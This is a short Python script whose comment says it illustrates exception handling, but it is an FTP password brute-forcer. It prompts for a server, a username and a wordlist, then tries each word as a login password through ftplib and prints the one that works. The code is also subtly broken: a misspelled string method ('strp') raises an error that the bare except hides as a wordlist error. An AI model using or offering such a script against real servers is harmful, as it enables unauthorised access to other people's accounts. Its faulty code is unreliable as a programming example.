# this code tries to explain exception handling
import ftplib
server = input("FTP Server : ")   #IP address
user = input("username : ")			#username of the account
Passwordlist = input("Path to Password list > ")	#any wordlist

try: 
	with open(Passwordlist, 'r') as pw:
		for word in pw:
			word = word.strip('\r').strp('\n')
			try:
				ftp=ftplib.FTP(server)
				ftp.login(user,word)
				print("Success ! The password is " + word)
			except:
				print("Still trying")
except:
	print('Wordlist Error')
